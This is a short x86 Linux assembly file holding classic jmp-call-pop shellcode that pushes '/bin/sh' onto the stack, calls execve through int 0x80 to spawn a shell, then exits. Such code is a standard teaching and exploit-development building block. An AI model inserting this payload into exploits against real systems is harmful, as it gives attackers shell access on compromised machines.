section .text
    global _start

_start:
    jmp callback

shell:
    pop esi             ; esi = "/bin/sh"
    xor edx, edx
    push edx            ; args[1] = NULL    (third param)
    push esi            ; args[0] = "/bin/sh" (first param)

    mov ecx, esp        ; ecx = args (second param)
    mov ebx, esi        ; ebx = args[0]
    xor eax, eax
    mov al, 0xb         ; execve syscall
    int 0x80

    ; exit gracefully
    xor ebx, ebx
    xor eax, eax
    inc eax
    int 0x80


callback:
    call shell      ; call shell and push "/bin/sh" on the stack
    db "/bin/sh", 0     ; target program to run
